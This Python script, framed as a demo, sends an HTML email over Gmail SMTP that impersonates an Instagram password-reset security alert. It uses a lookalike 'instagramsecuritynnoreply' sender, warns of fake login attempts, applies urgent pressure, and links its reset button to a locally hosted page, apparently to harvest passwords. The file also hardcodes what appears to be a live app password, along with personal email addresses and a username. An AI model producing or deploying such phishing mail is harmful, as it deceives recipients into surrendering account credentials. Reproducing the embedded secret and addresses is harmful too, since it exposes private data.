"""
Demo: Send an HTML email with a "Hello" button using Python + Gmail SMTP.

Setup:
1. Use a Gmail account.
2. Turn on 2-Step Verification: https://myaccount.google.com/security
3. Create an "App Password": https://myaccount.google.com/apppasswords
   (You cannot use your normal Gmail password with smtplib.)
4. Fill in SENDER_EMAIL, APP_PASSWORD, and RECEIVER_EMAIL below.
"""

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# ---- Config ----
SENDER_EMAIL = "instagramsecuritynnoreply@gmail.com"
APP_PASSWORD = "pyho bmbe vbvh geaa"   # NOT your normal Gmail password
RECEIVER_EMAIL = "ketanmahajan2424@gmail.com"
SUBJECT = " ⚠️ Security Alert - Reset your password"

#
# ---- HTML body - instagram Password Reset Email ----
HTML_BODY = """\
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
  </head>
  <body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; 
               background-color: #ffffff; padding: 40px 20px; margin: 0;">
    <div style="max-width: 600px; margin: 0 auto; text-align: center;">
      
      <!-- Logo Section -->
      <div style="margin-bottom: 50px;">
        <div style="font-family: 'Grand Hotel', cursive; font-size: 42px; font-weight: 400; color: #000;">
          Instagram
        </div>
      </div>
      
      <!-- Content Section -->
      <div style="margin: 50px 0;">
        <p style="font-size: 15px; color: #65676b; margin-bottom: 16px; line-height: 1.6;">
          Hi the_sonal_narwade,
        </p> <!-- SECURITY WARNING -->
        <div style="background-color: #fff3cd; border-left: 4px solid #ff6b6b; padding: 16px; 
                    margin: 16px auto 24px; max-width: 380px; border-radius: 3px; text-align: left;">
          <p style="font-size: 14px; color: #d9534f; margin: 0; font-weight: 600;">
            ⚠️ Security Alert
          </p>
          <p style="font-size: 13px; color: #d9534f; margin: 8px 0 0 0; line-height: 1.5;">
            We detected multiple login attempts on your account. For your security, you must change your password immediately.
          </p>
        </div>
        
        <!-- Single Button -->
        <div style="margin: 32px 0; max-width: 380px; margin-left: auto; margin-right: auto;">
          <a href="http://localhost:8000/reset-password"
             style="padding: 12px 20px; border: none; border-radius: 3px; font-size: 15px; 
                    font-weight: 600; text-align: center; text-decoration: none; display: block; 
                    width: 100%; background: #0a8ddc; color: white; box-sizing: border-box;">
            Reset your password
          </a>
        </div>
        
        <!-- Divider Text -->
        <div style="font-size: 15px; color: #65676b; margin: 32px 0 24px 0;">
        Take action immediately !
        </div>
        

        
        <!-- Security Info -->
        <p style="font-size: 13px; color: #65676b; line-height: 1.6; margin-top: 32px;">
          If you didn't request a login link or a password reset, you can ignore this message and 
          <a href="https://instagram.com/help" style="color: #0a8ddc; text-decoration: none;">learn more about why you may have received it.</a>
        </p>
        <p style="font-size: 13px; color: #65676b; line-height: 1.6; margin-top: 16px;">
          Only people who know your instagram password or click the login link in this email can log into your account.
        </p>
      </div>
      
      <!-- Meta Footer -->
      <div style="margin-top: 50px; padding-top: 24px; border-top: 1px solid #e5e7eb; font-size: 12px; color: #999;">
        <p style="margin-bottom: 16px; font-weight: 600;">instagram</p>
        <p style="margin-bottom: 16px;">
          © instagram. instagram Inc., India.
        </p>
        <p style="margin-bottom: 16px;">
          This message was sent to sonalvn31@gmail.com and intended for instagram_com. 
          <a href="https://instagram.com/remove-email" style="color: #0a8ddc; text-decoration: none;">Not your profile? Remove your email from this account.</a>
        </p>
      </div>
    </div>
  </body>
</html>
"""

def send_email():
    msg = MIMEMultipart("alternative")
    msg["Subject"] = SUBJECT
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECEIVER_EMAIL

    # Plain-text fallback for clients that don't render HTML
    text_part = MIMEText("Hi there! This is a demo email. Visit: https://instagram.com", "plain")
    html_part = MIMEText(HTML_BODY, "html")

    msg.attach(text_part)
    msg.attach(html_part)

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(SENDER_EMAIL, APP_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())

    print("Email sent successfully!")

if __name__ == "__main__":
    send_email()